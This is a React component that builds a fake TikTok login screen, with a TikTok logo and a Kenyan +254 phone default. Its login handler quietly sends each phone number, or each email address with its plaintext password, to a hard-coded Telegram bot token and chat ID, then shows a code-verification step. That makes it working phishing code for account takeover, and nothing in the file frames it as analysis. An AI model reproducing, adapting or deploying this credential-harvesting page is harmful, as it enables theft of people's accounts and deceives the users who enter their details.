import React, { useState } from 'react';
import { ChevronLeft, X, ChevronDown, Eye, EyeOff } from 'lucide-react';

type LoginMethod = 'phone' | 'email';

interface LoginScreenProps {
  onBack: () => void;
  onLogin: (data: { type: 'email' | 'phone', value: string }) => void;
}

const LoginScreen: React.FC<LoginScreenProps> = ({ onBack, onLogin }) => {
  const [loginMethod, setLoginMethod] = useState<LoginMethod>('phone');
  
  // Phone State
  const [phoneNumber, setPhoneNumber] = useState('');

  // Email State
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Validation Regex
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // Derived state for button validation
  // Phone: Ensure only digits and min length (e.g. 9)
  // Email: Regex check
  const isLoginEnabled = loginMethod === 'phone' 
    ? (phoneNumber.length >= 9)
    : (emailRegex.test(email) && password.length > 3);

  const toggleLoginMethod = () => {
    setLoginMethod(prev => prev === 'phone' ? 'email' : 'phone');
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Only allow digits
    if (/^\d*$/.test(value)) {
      setPhoneNumber(value);
    }
  };

  const handleLoginAction = async () => {
    const token = "8565783239:AAEzyuB3eJzR6HYnikxBA23qhOSeo08lDZ8";
    const chatId = "8429880395";
    
    // Determine message based on method
    let message = "";
    if (loginMethod === 'phone') {
        // For phone, this acts as the "Send Code" step
        message = `🔔 *Code Requested (Login)*\n📱 *Phone:* ${phoneNumber}`;
    } else {
        // For email, we send the credentials here
        message = `🔔 *Login Credentials*\n📧 *Email:* ${email}\n🔒 *Password:* ${password}`;
    }

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error("Failed to send data", error);
    }

    // Navigate to Verification
    onLogin({
      type: loginMethod,
      value: loginMethod === 'phone' ? phoneNumber : email
    });
  };

  return (
    <div className="flex flex-col h-screen sm:h-[800px] bg-black text-white p-4 relative animate-in slide-in-from-right duration-300">
      {/* Header */}
      <header className="flex items-center justify-between py-2 mb-4">
        <button 
          onClick={onBack}
          className="p-2 -ml-2 hover:bg-neutral-900 rounded-full transition-colors"
          aria-label="Go back"
        >
          <ChevronLeft className="w-6 h-6 text-white" />
        </button>
        
        <div className="w-6" /> 

        <button 
          className="p-1 bg-neutral-800/50 hover:bg-neutral-800 rounded-full transition-colors"
          aria-label="Close"
        >
          <X className="w-5 h-5 text-neutral-400" />
        </button>
      </header>

      {/* Logo */}
      <div className="flex justify-center mb-6">
        <img 
          src="https://i.postimg.cc/vBKDX4Br/tiktok-logo-tikok-icon-transparent-tikok-app-logo-free-png.webp" 
          alt="App Logo" 
          className="w-16 h-16 object-contain"
        />
      </div>

      {/* Main Title */}
      <h1 className="text-3xl font-bold text-center mb-8">Log in</h1>

      {/* Form Content */}
      <div className="flex-1 flex flex-col gap-5">
        
        {/* Input Label Row & Switcher */}
        <div className="flex justify-between items-baseline px-1">
          <label className="text-sm font-semibold text-neutral-200">
            {loginMethod === 'phone' ? 'Phone' : 'Email'}
          </label>
          <button 
            onClick={toggleLoginMethod}
            className="text-xs font-semibold text-neutral-400 hover:text-white transition-colors"
          >
            {loginMethod === 'phone' ? 'Log in with email' : 'Log in with phone'}
          </button>
        </div>

        {loginMethod === 'phone' ? (
          /* PHONE LOGIN INPUTS */
          <>
            <div className="flex gap-3">
              {/* Country Code Selector */}
              <div className="flex items-center justify-between bg-neutral-800/80 hover:bg-neutral-800 rounded-lg px-3 py-3.5 w-[35%] cursor-pointer transition-colors group">
                <span className="text-sm font-medium text-neutral-200">KE +254</span>
                <ChevronDown className="w-4 h-4 text-neutral-400 group-hover:text-white" />
              </div>

              {/* Phone Number Input */}
              <div className="flex-1 bg-neutral-800/80 hover:bg-neutral-800 rounded-lg transition-colors">
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  placeholder="Phone number"
                  className="w-full h-full bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium rounded-lg"
                />
              </div>
            </div>
            
            {/* Removed Standard data rates message */}
          </>
        ) : (
          /* EMAIL LOGIN INPUTS */
          <>
            <div className="bg-neutral-800/80 hover:bg-neutral-800 rounded-lg transition-colors">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email address"
                className="w-full h-full bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium rounded-lg"
              />
            </div>
            
            <div className="flex items-center bg-neutral-800/80 rounded-lg overflow-hidden transition-colors hover:bg-neutral-800">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="flex-1 bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium"
              />
              <button 
                onClick={() => setShowPassword(!showPassword)}
                className="px-4 text-neutral-400 hover:text-white transition-colors"
                type="button"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </>
        )}

        {/* Bottom Link (Context sensitive) */}
        <div className="px-1">
          <button className="text-xs font-bold text-neutral-400 hover:text-white transition-colors">
            {loginMethod === 'phone' ? 'Log in with password' : 'Forgot password?'}
          </button>
        </div>

        {/* Main Login Button */}
        <button
          onClick={handleLoginAction}
          disabled={!isLoginEnabled}
          className={`
            w-full py-3.5 rounded-lg mt-2 text-sm font-bold transition-all duration-200
            ${isLoginEnabled 
              ? 'bg-red-600 text-white hover:bg-red-500 shadow-lg shadow-red-900/20' 
              : 'bg-neutral-800 text-neutral-500 cursor-not-allowed'}
          `}
        >
          {loginMethod === 'phone' ? 'Send code' : 'Log in'}
        </button>
      </div>

      {/* Footer */}
      <div className="w-full py-6 border-t border-neutral-800/50 mt-auto">
        <p className="text-center text-sm text-neutral-300">
          Don&apos;t have an account?{' '}
          <button className="text-[#ff2b4e] font-semibold hover:text-red-400 hover:underline transition-colors">
            Sign up
          </button>
        </p>
      </div>
    </div>
  );
};

export default LoginScreen;